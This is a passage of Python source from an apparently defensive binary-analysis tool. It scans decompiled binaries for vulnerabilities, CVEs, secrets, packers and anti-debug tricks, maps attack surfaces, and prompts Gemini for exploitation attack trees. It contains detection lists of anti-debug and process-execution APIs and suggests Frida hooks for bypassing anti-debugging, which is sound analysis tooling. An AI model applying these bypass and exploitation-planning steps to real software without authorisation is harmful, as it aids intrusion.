        "verified_vulnerabilities": pattern_findings,
        "filtered_vulnerabilities": [],
        "verified_cves": cve_findings,
        "filtered_cves": [],
        "verified_secrets": sensitive_findings,
        "filtered_secrets": [],
        "verified_vuln_hunt": vuln_hunt_findings,
        "filtered_vuln_hunt": [],
        "attack_chains": [],
        "summary": {
            "total_findings": total,
            "verified_total": total,
            "filtered_total": 0,
            "ai_verified": False,
            "overall_risk": "UNKNOWN",
            "ai_summary": "AI verification unavailable - all findings included",
            "attack_chains_found": 0,
            "vulnerabilities": {"total": len(pattern_findings), "verified": len(pattern_findings), "filtered": 0},
            "cves": {"total": len(cve_findings), "verified": len(cve_findings), "filtered": 0},
            "secrets": {"total": len(sensitive_findings), "verified": len(sensitive_findings), "filtered": 0},
            "vuln_hunt": {"total": len(vuln_hunt_findings), "verified": len(vuln_hunt_findings), "filtered": 0},
        },
        "prioritized_actions": [],
    }


def _apply_verdicts(
    findings: List[Dict],
    verdicts: List[Dict],
    finding_type: str
) -> Dict[str, List[Dict]]:
    """Apply AI verdicts to findings and separate into verified/filtered."""
    verdict_map = {v.get("id"): v for v in verdicts}
    verified = []
    filtered = []
    
    for idx, finding in enumerate(findings):
        verdict = verdict_map.get(idx, {})
        verdict_type = verdict.get("verdict", "REAL")
        
        # Add AI metadata
        finding["ai_verdict"] = verdict_type
        finding["ai_confidence"] = verdict.get("confidence", 50)
        finding["ai_reason"] = verdict.get("reason", "")
        
        if finding_type == "vulnerability":
            finding["ai_priority"] = verdict.get("priority", 5)
        elif finding_type == "cve":
            finding["ai_exploitability"] = verdict.get("exploitability", "MEDIUM")
        elif finding_type == "secret":
            finding["ai_risk"] = verdict.get("risk", "MEDIUM")
        
        if verdict_type == "FALSE_POSITIVE":
            filtered.append(finding)
        else:
            verified.append(finding)
    
    # Sort verified by priority/severity
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    verified.sort(key=lambda x: (
        severity_order.get(x.get("severity", "low"), 4),
        -x.get("ai_confidence", 0),
        x.get("ai_priority", 10)
    ))
    
    return {"verified": verified, "filtered": filtered}


async def run_comprehensive_binary_analysis(
    binary_path: str,
    ghidra_result: Optional[Dict[str, Any]] = None,
    static_result: Optional[Any] = None,
    verify_with_ai: bool = True,
    on_progress: Optional[callable] = None
) -> Dict[str, Any]:
    """
    Run the complete binary analysis pipeline with all phases.
    
    Phases:
    1. Pattern-based vulnerability scanning (from decompiled code)
    2. CVE lookup (from imports/libraries)
    3. Sensitive data discovery
    4. Unified AI verification
    
    Args:
        binary_path: Path to the binary file
        ghidra_result: Optional pre-computed Ghidra decompilation
        static_result: Optional pre-computed static analysis
        verify_with_ai: Whether to use AI for verification
        on_progress: Optional callback for progress updates
        
    Returns:
        Complete analysis results with all findings
    """
    import time
    start_time = time.time()
    results = {}
    
    def progress(msg: str, pct: int = 0):
        if on_progress:
            on_progress(msg, pct)
        logger.info(f"Binary analysis: {msg} ({pct}%)")
    
    progress("Starting comprehensive binary analysis...", 0)
    
    # Phase 1: Pattern-based vulnerability scanning
    pattern_findings = []
    if ghidra_result and "functions" in ghidra_result:
        progress("Running pattern-based vulnerability scan...", 10)
        pattern_result = scan_decompiled_binary_comprehensive(ghidra_result)
        pattern_findings = pattern_result.get("findings", [])
        results["pattern_scan"] = pattern_result
        progress(f"Pattern scan found {len(pattern_findings)} potential vulnerabilities", 25)
    
    # Phase 2: CVE lookup
    progress("Looking up CVEs for libraries...", 30)
    cve_findings = []
    
    # Extract metadata and strings for CVE lookup
    binary_metadata = {}
    strings = []
    
    if static_result:
        if hasattr(static_result, 'metadata'):
            binary_metadata = {
                "file_type": static_result.metadata.file_type,
                "architecture": static_result.metadata.architecture,
                "is_packed": static_result.metadata.is_packed,
                "mitigations": static_result.metadata.mitigations,
                "linked_libraries": getattr(static_result.metadata, 'linked_libraries', []),
            }
        if hasattr(static_result, 'strings'):
            strings = [{"value": s.value, "category": s.category} for s in static_result.strings]
        if hasattr(static_result, 'imports'):
            binary_metadata["imports"] = [
                {"name": imp.name, "library": imp.library}
                for imp in static_result.imports
            ]
    
    cve_result = await comprehensive_binary_cve_scan(binary_metadata, strings)
    cve_findings = cve_result.get("findings", [])
    results["cve_scan"] = cve_result
    progress(f"CVE lookup found {len(cve_findings)} potential vulnerabilities", 50)
    
    # Phase 3: Sensitive data discovery
    progress("Scanning for sensitive data...", 55)
    decompiled_code = None
    if ghidra_result and "functions" in ghidra_result:
        decompiled_code = ghidra_result
    
    # Convert strings for sensitive scan
    string_dicts = strings if strings else []
    
    sensitive_result = await comprehensive_binary_sensitive_scan(
        strings=string_dicts,
        decompiled_code=decompiled_code,
        verify_with_ai=False  # We'll do unified verification later
    )
    sensitive_findings = sensitive_result.get("findings", [])
    results["sensitive_scan"] = sensitive_result
    progress(f"Sensitive scan found {len(sensitive_findings)} potential secrets", 75)
    
    # Phase 4: Unified AI verification
    if verify_with_ai and (pattern_findings or cve_findings or sensitive_findings):
        progress("Running unified AI verification...", 80)
        verification_result = await verify_binary_findings_unified(
            pattern_findings=pattern_findings,
            cve_findings=cve_findings,
            sensitive_findings=sensitive_findings,
            decompiled_code=decompiled_code,
            binary_metadata=binary_metadata
        )
        results["verification"] = verification_result
        
        # Update results with verified findings
        results["verified_vulnerabilities"] = verification_result.get("verified_vulnerabilities", [])
        results["verified_cves"] = verification_result.get("verified_cves", [])
        results["verified_secrets"] = verification_result.get("verified_secrets", [])
        results["prioritized_actions"] = verification_result.get("prioritized_actions", [])
        results["summary"] = verification_result.get("summary", {})
        
        progress(f"Verification complete: {results['summary'].get('verified_total', 0)} verified findings", 100)
    else:
        # No AI verification - use all findings
        results["verified_vulnerabilities"] = pattern_findings
        results["verified_cves"] = cve_findings
        results["verified_secrets"] = sensitive_findings
        results["prioritized_actions"] = []
        results["summary"] = {
            "total_findings": len(pattern_findings) + len(cve_findings) + len(sensitive_findings),
            "verified_total": len(pattern_findings) + len(cve_findings) + len(sensitive_findings),
            "ai_verified": False,
        }
        progress("Analysis complete (no AI verification)", 100)
    
    elapsed = time.time() - start_time
    results["total_analysis_time"] = elapsed
    
    logger.info(f"Comprehensive binary analysis complete in {elapsed:.1f}s")
    
    return results


# =============================================================================
# PART 5: BINARY OBFUSCATION/PACKING ANALYSIS (Like APK's obfuscation analysis)
# =============================================================================

# Known packers and their signatures
KNOWN_PACKERS = {
    "UPX": {
        "signatures": ["UPX!", "UPX0", "UPX1", "UPX2"],
        "sections": [".UPX0", ".UPX1", ".UPX2"],
        "description": "Ultimate Packer for eXecutables - open source packer"
    },
    "ASPack": {
        "signatures": [".aspack", "ASPack"],
        "sections": [".aspack", ".adata"],
        "description": "Commercial packer for Win32 executables"
    },
    "Themida": {
        "signatures": ["Themida", ".themida"],
        "sections": [".themida"],
        "description": "Advanced commercial protector with VM and anti-debug"
    },
    "VMProtect": {
        "signatures": ["VMProtect", ".vmp0", ".vmp1"],
        "sections": [".vmp0", ".vmp1", ".vmp2"],
        "description": "Advanced VM-based protection"
    },
    "Enigma": {
        "signatures": ["Enigma protector", ".enigma"],
        "sections": [".enigma1", ".enigma2"],
        "description": "Enigma Protector with licensing"
    },
    "PECompact": {
        "signatures": ["PEC2", "PECompact2"],
        "sections": ["PEC2"],
        "description": "PE executable compressor"
    },
    "MPRESS": {
        "signatures": ["MPRESS1", "MPRESS2"],
        "sections": [".MPRESS1", ".MPRESS2"],
        "description": "Free high-ratio executable packer"
    },
    "Petite": {
        "signatures": ["petite", ".petite"],
        "sections": [".petite"],
        "description": "Win32 executable compressor"
    },
    "NSPack": {
        "signatures": ["nsp0", "nsp1", "NSPack"],
        "sections": [".nsp0", ".nsp1"],
        "description": "North Star packer"
    },
    "PELock": {
        "signatures": ["PELock"],
        "sections": [],
        "description": "Software protection system"
    },
}

# Obfuscation indicators for binaries
BINARY_OBFUSCATION_INDICATORS = {
    "entropy_analysis": {
        "high_entropy_threshold": 7.0,
        "packed_entropy_threshold": 7.5,
        "description": "High entropy sections indicate compression or encryption"
    },
    "section_anomalies": {
        "executable_data": "Data section marked as executable",
        "writable_code": "Code section marked as writable",
        "no_name": "Section with empty or null name",
        "unusual_size": "Section with unusual size ratio",
    },
    "import_hiding": {
        "few_imports": "Very few imports (< 5) suggests dynamic resolution",
        "loadlibrary_only": "Only LoadLibrary/GetProcAddress imports",
        "no_imports": "No import table suggests packed/encrypted",
    },
    "anti_analysis": {
        "isdebuggerpresent": "Anti-debug: IsDebuggerPresent",
        "ntqueryinformation": "Anti-debug: NtQueryInformationProcess",
        "outputdebugstring": "Anti-debug: OutputDebugString timing",
        "rdtsc": "Anti-debug: RDTSC timing checks",
        "int2d": "Anti-debug: INT 2D",
        "cpuid": "Anti-VM: CPUID checks",
        "vmware_port": "Anti-VM: VMware I/O port",
    }
}


def analyze_binary_obfuscation(
    binary_path: str,
    static_result: Optional[Any] = None,
    ghidra_result: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Analyze binary for obfuscation, packing, and anti-analysis techniques.
    
    Similar to APK's analyze_apk_obfuscation() function.
    
    Args:
        binary_path: Path to the binary file
        static_result: Pre-computed static analysis result
        ghidra_result: Pre-computed Ghidra decompilation
        
    Returns:
        Comprehensive obfuscation analysis results
    """
    import time
    import math
    start_time = time.time()
    
    result = {
        "overall_obfuscation_level": "none",  # none, low, medium, high, extreme
        "obfuscation_score": 0,  # 0-100
        "is_packed": False,
        "detected_packers": [],
        "detected_protectors": [],
        "indicators": [],
        "section_analysis": [],
        "import_analysis": {},
        "anti_analysis_techniques": [],
        "entropy_analysis": {},
        "deobfuscation_strategies": [],
        "recommended_tools": [],
        "frida_hooks_suggested": [],
        "warnings": [],
        "ai_analysis_summary": None,
        "reverse_engineering_difficulty": "easy",  # easy, moderate, hard, expert
    }
    
    try:
        binary_path = Path(binary_path)
        if not binary_path.exists():
            result["warnings"].append(f"Binary file not found: {binary_path}")
            return result
        
        # Read binary data
        with open(binary_path, "rb") as f:
            binary_data = f.read()
        
        # Calculate overall entropy
        def calculate_entropy(data: bytes) -> float:
            if not data:
                return 0.0
            freq = {}
            for byte in data:
                freq[byte] = freq.get(byte, 0) + 1
            entropy = 0.0
            for count in freq.values():
                p = count / len(data)
                if p > 0:
                    entropy -= p * math.log2(p)
            return entropy
        
        overall_entropy = calculate_entropy(binary_data)
        result["entropy_analysis"]["overall"] = round(overall_entropy, 2)
        
        # Check for packer signatures in raw data
        binary_str = binary_data[:50000].decode('latin-1', errors='ignore')
        
        for packer_name, packer_info in KNOWN_PACKERS.items():
            for sig in packer_info["signatures"]:
                if sig.lower() in binary_str.lower():
                    result["detected_packers"].append({
                        "name": packer_name,
                        "description": packer_info["description"],
                        "confidence": "high",
                    })
                    result["is_packed"] = True
                    break
        
        # Analyze with static result if available
        if static_result:
            # Section analysis
            sections = getattr(static_result.metadata, 'sections', [])
            high_entropy_sections = []
            suspicious_sections = []
            
            for section in sections:
                section_name = section.get("name", "")
                section_entropy = section.get("entropy", 0)
                section_flags = section.get("characteristics", 0)
                
                section_info = {
                    "name": section_name,
                    "entropy": round(section_entropy, 2) if section_entropy else 0,
                    "size": section.get("size", 0),
                    "virtual_size": section.get("virtual_size", 0),
                    "suspicious_flags": [],
                }
                
                # Check entropy
                if section_entropy and section_entropy > 7.0:
                    high_entropy_sections.append(section_name)
                    section_info["suspicious_flags"].append("high_entropy")
                
                # Check for packer section names
                for packer_name, packer_info in KNOWN_PACKERS.items():
                    if section_name in packer_info["sections"]:
                        result["detected_packers"].append({
                            "name": packer_name,
                            "description": packer_info["description"],
                            "confidence": "high",
                            "evidence": f"Section name: {section_name}"
                        })
                        result["is_packed"] = True
                
                # Check for unusual section characteristics
                if section_name == "" or section_name.startswith("\x00"):
                    section_info["suspicious_flags"].append("empty_name")
                    suspicious_sections.append(("empty_name", section_name))
                
                result["section_analysis"].append(section_info)
            
            result["entropy_analysis"]["high_entropy_sections"] = high_entropy_sections
            
            if high_entropy_sections:
                result["indicators"].append({
                    "indicator_type": "high_entropy_sections",
                    "confidence": 80,
                    "evidence": high_entropy_sections,
                    "description": f"{len(high_entropy_sections)} sections with entropy > 7.0 (likely encrypted/compressed)"
                })
            
            # Import analysis
            imports = getattr(static_result, 'imports', [])
            total_imports = len(imports)
            result["import_analysis"]["total_imports"] = total_imports
            
            suspicious_imports = []
            anti_debug_imports = []
            
            anti_debug_apis = [
                "IsDebuggerPresent", "CheckRemoteDebuggerPresent", 
                "NtQueryInformationProcess", "OutputDebugString",
                "GetTickCount", "QueryPerformanceCounter"
            ]
            
            anti_vm_apis = [
                "GetSystemFirmwareTable", "EnumSystemFirmwareTable"
            ]
            
            dynamic_loading_apis = ["LoadLibrary", "GetProcAddress", "LdrLoadDll"]
            
            for imp in imports:
                imp_name = imp.name if hasattr(imp, 'name') else str(imp)
                
                for api in anti_debug_apis:
                    if api.lower() in imp_name.lower():
                        anti_debug_imports.append(imp_name)
                        
                for api in dynamic_loading_apis:
                    if api.lower() in imp_name.lower():
                        suspicious_imports.append(imp_name)
            
            result["import_analysis"]["anti_debug_apis"] = anti_debug_imports
            result["import_analysis"]["dynamic_loading_apis"] = suspicious_imports
            
            if anti_debug_imports:
                result["anti_analysis_techniques"].append({
                    "technique": "anti_debugging",
                    "apis": anti_debug_imports,
                    "description": "Binary uses anti-debugging APIs"
                })
                result["indicators"].append({
                    "indicator_type": "anti_debug",
                    "confidence": 70,
                    "evidence": anti_debug_imports,
                    "description": f"Uses {len(anti_debug_imports)} anti-debugging APIs"
                })
            
            if total_imports < 10 and not result["is_packed"]:
                result["indicators"].append({
                    "indicator_type": "few_imports",
                    "confidence": 60,
                    "evidence": f"Only {total_imports} imports",
                    "description": "Very few imports suggests dynamic resolution or packing"
                })
            
            # Check if packed from static result
            if getattr(static_result.metadata, 'is_packed', False):
                result["is_packed"] = True
                packer_name = getattr(static_result.metadata, 'packer_name', None)
                if packer_name and not any(p["name"] == packer_name for p in result["detected_packers"]):
                    result["detected_packers"].append({
                        "name": packer_name,
                        "confidence": "high",
                        "evidence": "Detected by static analysis"
                    })
        
        # Analyze decompiled code for obfuscation
        if ghidra_result and "functions" in ghidra_result:
            functions = ghidra_result.get("functions", [])
            
            # Count function naming patterns
            short_names = 0
            random_names = 0
            readable_names = 0
            
            for func in functions:
                func_name = func.get("name", "")
                if len(func_name) <= 3:
                    short_names += 1
                elif re.match(r'^[a-z]{1,2}[0-9]+$', func_name, re.IGNORECASE):
                    random_names += 1
                elif re.match(r'^(FUN_|DAT_|LAB_|PTR_)', func_name):
                    # Ghidra default names don't count
                    pass
                else:
                    readable_names += 1
            
            result["function_naming"] = {
                "total_functions": len(functions),
                "short_names": short_names,
                "random_names": random_names,
                "readable_names": readable_names,
            }
            
            # Check for control flow obfuscation
            opaque_predicates = 0
            for func in functions[:50]:  # Sample first 50 functions
                code = func.get("code", "")
                # Look for patterns suggesting opaque predicates
                if re.search(r'if\s*\(\s*[01]\s*(==|!=)\s*[01]\s*\)', code):
                    opaque_predicates += 1
                if re.search(r'while\s*\(\s*false\s*\)', code):
                    opaque_predicates += 1
            
            if opaque_predicates > 0:
                result["indicators"].append({
                    "indicator_type": "opaque_predicates",
                    "confidence": 60,
                    "evidence": f"{opaque_predicates} potential opaque predicates",
                    "description": "Control flow obfuscation detected"
                })
        
        # Calculate obfuscation score
        score = 0
        
        if result["is_packed"]:
            score += 40
        
        if overall_entropy > 7.5:
            score += 20
        elif overall_entropy > 7.0:
            score += 10
        
        score += len(result["detected_packers"]) * 15
        score += len(result["anti_analysis_techniques"]) * 10
        score += len(result["indicators"]) * 5
        
        result["obfuscation_score"] = min(score, 100)
        
        # Determine obfuscation level
        if score >= 80:
            result["overall_obfuscation_level"] = "extreme"
            result["reverse_engineering_difficulty"] = "expert"
        elif score >= 60:
            result["overall_obfuscation_level"] = "high"
            result["reverse_engineering_difficulty"] = "hard"
        elif score >= 40:
            result["overall_obfuscation_level"] = "medium"
            result["reverse_engineering_difficulty"] = "moderate"
        elif score >= 20:
            result["overall_obfuscation_level"] = "low"
            result["reverse_engineering_difficulty"] = "moderate"
        else:
            result["overall_obfuscation_level"] = "none"
            result["reverse_engineering_difficulty"] = "easy"
        
        # Generate deobfuscation strategies
        if result["is_packed"]:
            result["deobfuscation_strategies"].append(
                "Unpack the binary before analysis - try automatic unpacking or dump from memory"
            )
            result["recommended_tools"].append("UPX (upx -d for UPX-packed)")
            result["recommended_tools"].append("x64dbg with Scylla plugin")
            result["recommended_tools"].append("PE-sieve for memory dumps")
        
        if result["anti_analysis_techniques"]:
            result["deobfuscation_strategies"].append(
                "Patch or hook anti-debugging checks"
            )
            result["recommended_tools"].append("ScyllaHide (anti-anti-debug)")
            result["recommended_tools"].append("TitanHide")
        
        if overall_entropy > 7.0:
            result["deobfuscation_strategies"].append(
                "Encrypted sections - look for decryption routine or dump decrypted memory"
            )
        
        result["recommended_tools"].append("Ghidra with deobfuscation scripts")
        result["recommended_tools"].append("IDA Pro with Hex-Rays decompiler")
        result["recommended_tools"].append("Binary Ninja")
        
        # Generate Frida hook suggestions for anti-analysis bypass
        if anti_debug_imports if 'anti_debug_imports' in dir() else []:
            for api in anti_debug_imports[:5]:
                result["frida_hooks_suggested"].append({
                    "target": api,
                    "description": f"Hook {api} to bypass anti-debugging",
                    "hook_type": "return_override"
                })
        
    except Exception as e:
        logger.error(f"Binary obfuscation analysis failed: {e}")
        result["warnings"].append(f"Analysis error: {str(e)}")
    
    result["analysis_time"] = round(time.time() - start_time, 2)
    
    return result


# =============================================================================
# PART 6: BINARY ATTACK SURFACE MAPPING (Like APK's attack surface)
# =============================================================================

def generate_binary_attack_surface(
    static_result: Optional[Any] = None,
    ghidra_result: Optional[Dict[str, Any]] = None,
    binary_path: Optional[str] = None
) -> Dict[str, Any]:
    """
    Generate attack surface map for a binary.
    
    Maps entry points, exports, callbacks, and potential attack vectors.
    Similar to APK's generate_attack_surface_map().
    
    Args:
        static_result: Static analysis result
        ghidra_result: Ghidra decompilation result
        binary_path: Path to the binary
        
    Returns:
        Attack surface mapping with entry points and vectors
    """
    attack_surface = {
        "entry_points": [],
        "exported_functions": [],
        "callbacks": [],
        "network_interfaces": [],
        "file_operations": [],
        "registry_operations": [],
        "process_operations": [],
        "crypto_operations": [],
        "dangerous_functions": [],
        "potential_attack_vectors": [],
        "attack_graph_nodes": [],
        "attack_graph_edges": [],
        "summary": {},
    }
    
    try:
        # Analyze exports
        if static_result:
            exports = getattr(static_result, 'exports', [])
            for exp in exports:
                attack_surface["exported_functions"].append({
                    "name": exp if isinstance(exp, str) else exp.get("name", "unknown"),
                    "type": "export",
                    "risk": "medium",
                    "description": "Exported function - external entry point"
                })
                attack_surface["entry_points"].append({
                    "name": exp if isinstance(exp, str) else exp.get("name", "unknown"),
                    "type": "export",
                })
            
            # Analyze imports for attack vectors
            imports = getattr(static_result, 'imports', [])
            
            # Dangerous function categories
            dangerous_funcs = {
                "memory": ["strcpy", "strcat", "sprintf", "gets", "scanf", "memcpy", "memmove"],
                "network": ["socket", "connect", "send", "recv", "WSASocket", "bind", "listen", "accept"],
                "file": ["CreateFile", "ReadFile", "WriteFile", "DeleteFile", "fopen", "fread", "fwrite"],
                "process": ["CreateProcess", "ShellExecute", "WinExec", "system", "exec", "popen"],
                "registry": ["RegOpenKey", "RegSetValue", "RegCreateKey", "RegDeleteKey"],
                "crypto": ["CryptEncrypt", "CryptDecrypt", "CryptHashData", "CryptGenRandom"],
            }
            
            for imp in imports:
                imp_name = imp.name if hasattr(imp, 'name') else str(imp)
                imp_lib = imp.library if hasattr(imp, 'library') else ""
                
                for category, funcs in dangerous_funcs.items():
                    for func in funcs:
                        if func.lower() in imp_name.lower():
                            attack_surface["dangerous_functions"].append({
                                "name": imp_name,
                                "library": imp_lib,
                                "category": category,
                                "risk": "high" if category in ["memory", "process"] else "medium",
                            })
                            
                            if category == "network":
                                attack_surface["network_interfaces"].append(imp_name)
                            elif category == "file":
                                attack_surface["file_operations"].append(imp_name)
                            elif category == "registry":
                                attack_surface["registry_operations"].append(imp_name)
                            elif category == "process":
                                attack_surface["process_operations"].append(imp_name)
                            elif category == "crypto":
                                attack_surface["crypto_operations"].append(imp_name)
                            break
            
            # TLS callbacks are entry points
            tls_callbacks = getattr(static_result.metadata, 'tls_callbacks', [])
            for tls in tls_callbacks:
                attack_surface["callbacks"].append({
                    "name": f"TLS_Callback_{hex(tls)}",
                    "address": hex(tls),
                    "type": "tls_callback",
                    "risk": "high",
                    "description": "TLS callback - executes before main entry point"
                })
                attack_surface["entry_points"].append({
                    "name": f"TLS_Callback_{hex(tls)}",
                    "type": "tls_callback",
                })
        
        # Analyze Ghidra results for more entry points
        if ghidra_result and "functions" in ghidra_result:
            functions = ghidra_result.get("functions", [])
            
            # Look for callback patterns in decompiled code
            callback_patterns = [
                (r'SetWindowsHookEx', "windows_hook", "Windows hook callback"),
                (r'CreateThread', "thread_entry", "Thread entry point"),
                (r'RegisterClass.*wndproc', "wndproc", "Window procedure callback"),
                (r'SetTimer', "timer_callback", "Timer callback"),
                (r'EnumWindows', "enum_callback", "Enumeration callback"),
            ]
            
            for func in functions[:100]:  # Check first 100 functions
                code = func.get("code", "")
                func_name = func.get("name", "")
                
                for pattern, cb_type, desc in callback_patterns:
                    if re.search(pattern, code, re.IGNORECASE):
                        attack_surface["callbacks"].append({
                            "name": func_name,
                            "type": cb_type,
                            "risk": "medium",
                            "description": desc
                        })
        
        # Generate potential attack vectors
        if attack_surface["network_interfaces"]:
            attack_surface["potential_attack_vectors"].append({
                "vector": "Network Input",
                "description": "Binary handles network data - potential for remote exploitation",
                "risk": "high",
                "related_functions": attack_surface["network_interfaces"][:5]
            })
        
        if attack_surface["file_operations"]:
            attack_surface["potential_attack_vectors"].append({
                "vector": "File Input",
                "description": "Binary reads files - potential for malicious file exploitation",
                "risk": "medium",
                "related_functions": attack_surface["file_operations"][:5]
            })
        
        dangerous_memory = [f for f in attack_surface["dangerous_functions"] if f["category"] == "memory"]
        if dangerous_memory:
            attack_surface["potential_attack_vectors"].append({
                "vector": "Memory Corruption",
                "description": "Uses unsafe memory functions - potential buffer overflow",
                "risk": "critical",
                "related_functions": [f["name"] for f in dangerous_memory[:5]]
            })
        
        if attack_surface["process_operations"]:
            attack_surface["potential_attack_vectors"].append({
                "vector": "Command Injection",
                "description": "Binary executes external processes - potential command injection",
                "risk": "critical",
                "related_functions": attack_surface["process_operations"][:5]
            })
        
        # Build attack graph nodes
        node_id = 0
        for ep in attack_surface["entry_points"][:20]:
            attack_surface["attack_graph_nodes"].append({
                "id": f"entry_{node_id}",
                "name": ep["name"],
                "type": "entry_point",
                "label": ep["type"]
            })
            node_id += 1
        
        for vector in attack_surface["potential_attack_vectors"]:
            attack_surface["attack_graph_nodes"].append({
                "id": f"vector_{node_id}",
                "name": vector["vector"],
                "type": "attack_vector",
                "label": vector["risk"]
            })
            node_id += 1
        
        # Summary
        attack_surface["summary"] = {
            "total_entry_points": len(attack_surface["entry_points"]),
            "total_exports": len(attack_surface["exported_functions"]),
            "total_callbacks": len(attack_surface["callbacks"]),
            "total_dangerous_functions": len(attack_surface["dangerous_functions"]),
            "total_attack_vectors": len(attack_surface["potential_attack_vectors"]),
            "has_network": len(attack_surface["network_interfaces"]) > 0,
            "has_file_ops": len(attack_surface["file_operations"]) > 0,
            "has_process_ops": len(attack_surface["process_operations"]) > 0,
            "overall_risk": "critical" if any(v["risk"] == "critical" for v in attack_surface["potential_attack_vectors"]) 
                          else "high" if attack_surface["potential_attack_vectors"]
                          else "medium"
        }
        
    except Exception as e:
        logger.error(f"Attack surface generation failed: {e}")
        attack_surface["error"] = str(e)
    
    return attack_surface


async def generate_binary_attack_tree_mermaid(
    attack_surface: Dict[str, Any],
    ghidra_result: Optional[Dict[str, Any]] = None,
    verified_findings: Optional[List[Dict]] = None,
    is_legitimate_software: bool = False
) -> Optional[str]:
    """
    Generate AI-powered attack tree diagram in Mermaid format.
    
    Shows exploitation paths from an attacker's perspective.
    
    Args:
        attack_surface: Attack surface mapping
        ghidra_result: Ghidra decompilation
        verified_findings: Verified vulnerability findings
        is_legitimate_software: Whether this is known legitimate software
        
    Returns:
        Mermaid diagram string
    """
    if not settings.gemini_api_key:
        # Generate basic diagram without AI
        return _generate_basic_attack_tree(attack_surface, verified_findings)
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # Build context
        context = f"""Binary Attack Surface Analysis:

ENTRY POINTS (Ways to interact with the binary):
- Total Entry Points: {attack_surface['summary'].get('total_entry_points', 0)}
- Exports: {attack_surface['summary'].get('total_exports', 0)}
- Callbacks: {attack_surface['summary'].get('total_callbacks', 0)}
- Network Handlers: {attack_surface['summary'].get('network_handlers', 0)}
- File Handlers: {attack_surface['summary'].get('file_handlers', 0)}

DANGEROUS FUNCTION USAGE:
- Total Dangerous Functions: {attack_surface['summary'].get('total_dangerous_functions', 0)}
- Memory Unsafe: {len([f for f in attack_surface.get('dangerous_functions', []) if f.get('category') == 'memory'])}
- Format String: {len([f for f in attack_surface.get('dangerous_functions', []) if f.get('category') == 'format'])}
- Command Injection: {len([f for f in attack_surface.get('dangerous_functions', []) if f.get('category') == 'command'])}

IDENTIFIED ATTACK VECTORS:
{json.dumps(attack_surface.get('potential_attack_vectors', [])[:8], indent=2)}

TOP DANGEROUS FUNCTIONS:
{json.dumps(attack_surface.get('dangerous_functions', [])[:15], indent=2)}
"""
        
        if verified_findings:
            vuln_summary = []
            for f in verified_findings[:10]:
                vuln_summary.append(f"- [{f.get('severity', 'medium').upper()}] {f.get('category', 'unknown')}: {f.get('title', 'N/A')}")
            context += f"\n\nVERIFIED VULNERABILITIES:\n" + "\n".join(vuln_summary)
        
        if ghidra_result:
            funcs = ghidra_result.get("functions", [])[:10]
            func_list = [f.get("name", "unknown") for f in funcs]
            context += f"\n\nKEY FUNCTIONS (from decompilation):\n{', '.join(func_list)}"
        
        # Use different prompts for legitimate vs unknown software
        if is_legitimate_software:
            prompt = f"""You are an offensive security researcher. Create an ATTACK SURFACE MAP for this LEGITIMATE SOFTWARE.


  IMPORTANT: THIS IS VERIFIED LEGITIMATE SOFTWARE (e.g., Chrome, Firefox, etc.)


This is NOT malware. You are mapping the attack surface that external attackers
could potentially target - the same type of analysis done in bug bounty programs.

{context}

Create a Mermaid flowchart showing EXTERNAL ATTACK SURFACES - how an attacker
might try to compromise this legitimate application from the outside:

1. **EXTERNAL INPUTS** - Where does the software accept input from untrusted sources?
2. **DATA PROCESSING** - How is untrusted data processed internally?
3. **TRUST BOUNDARIES** - Where are privilege/trust transitions?
4. **POTENTIAL WEAKNESSES** - Areas that could contain vulnerabilities
5. **SECURITY MITIGATIONS** - Protections in place (ASLR, DEP, CFG, etc.)

Structure:
```mermaid
flowchart TD
    subgraph External[" EXTERNAL INPUTS"]
        E1["Network Traffic"]
        E2["File Handlers"]
        E3["IPC Messages"]
    end
    
    subgraph Processing[" DATA PROCESSING"]
        P1["Parser Components"]
        P2["Protocol Handlers"]
    end
    
    subgraph Boundaries[" TRUST BOUNDARIES"]
        B1["Sandbox Boundary"]
        B2["Privilege Level"]
    end
    
    subgraph Mitigations[" PROTECTIONS"]
        M1["ASLR/DEP"]
        M2["CFG/CET"]
    end
    
    External --> Processing
    Processing --> Boundaries
```

Requirements:
- Focus on attack SURFACE not attack TREES (map inputs, not exploitation)
- Show security mitigations present
- Use blue/green colors for protected areas, yellow for areas needing review
- Do NOT imply the software is malicious
- Max 30 nodes to keep readable

Return ONLY the mermaid code block."""
        else:
            prompt = f"""You are an offensive security researcher. Create an ATTACK TREE showing how to exploit this binary.

{context}

Create a Mermaid flowchart that maps out:
1. **GOALS** - What an attacker wants to achieve (code execution, data theft, privilege escalation)
2. **ENTRY POINTS** - Initial access vectors
3. **ATTACK PATHS** - How to reach vulnerabilities from entry points
4. **EXPLOITABLE WEAKNESSES** - Specific vulnerabilities to target
5. **TECHNIQUES** - Methods to exploit each weakness
6. **IMPACT** - What each successful exploit achieves

Structure:
```mermaid
flowchart TD
    subgraph Goals[" ATTACKER GOALS"]
        G1[" Code Execution"]
        G2[" Privilege Escalation"]
        G3[" Data Exfiltration"]
    end
    
    subgraph Entry[" ENTRY POINTS"]
        E1["Network Input"]
        E2["File Parsing"]
        E3["User Input"]
    end
    
    subgraph Vulns[" VULNERABILITIES"]
        V1["Buffer Overflow in X"]
        V2["Format String in Y"]
    end
    
    subgraph Techniques[" TECHNIQUES"]
        T1["ROP Chain"]
        T2["Heap Spray"]
    end
    
    Entry --> Vulns
    Vulns --> Techniques
    Techniques --> Goals
```

Requirements:
- Show the EASIEST/MOST LIKELY attack paths in bold
- Color-code by severity (red=critical, orange=high, yellow=medium)
- Include specific function names where known
- Show dependencies (what must succeed first)
- Max 35 nodes to keep readable

Return ONLY the mermaid code block."""

        response = await asyncio.to_thread(
            lambda: sync_gemini_request_with_retry(
                lambda: client.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
                ),
                max_retries=2,
                base_delay=2.0,
                timeout_seconds=60.0,
                operation_name="Binary attack tree generation"
            )
        )
        
        if response and response.text:
            # Extract mermaid code
            mermaid_match = re.search(r'```mermaid\s*([\s\S]*?)\s*```', response.text)
            if mermaid_match:
                diagram = mermaid_match.group(1).strip()
            elif response.text.strip().startswith("flowchart") or response.text.strip().startswith("graph"):
                diagram = response.text.strip()
            else:
                return _generate_basic_attack_tree(attack_surface, verified_findings)
            
            # Sanitize the diagram for mermaid compatibility
            diagram = _sanitize_mermaid_diagram(diagram)
            return diagram
        
        return _generate_basic_attack_tree(attack_surface, verified_findings)
        
    except Exception as e:
        logger.error(f"AI attack tree generation failed: {e}")
